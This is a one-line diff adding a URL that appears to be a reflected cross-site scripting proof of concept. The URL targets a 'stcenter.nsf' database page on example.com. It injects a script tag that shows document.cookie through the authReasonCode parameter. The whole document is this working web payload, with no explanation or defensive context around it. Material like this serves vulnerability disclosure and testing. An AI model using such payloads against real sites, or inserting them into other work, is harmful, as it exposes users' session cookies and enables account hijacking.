@@ -1,0 +1,1 @@
+http://www.example.com/stcenter.nsf?OpenDatabase&authReasonCode="><script>alert(document.cookie);</script>"
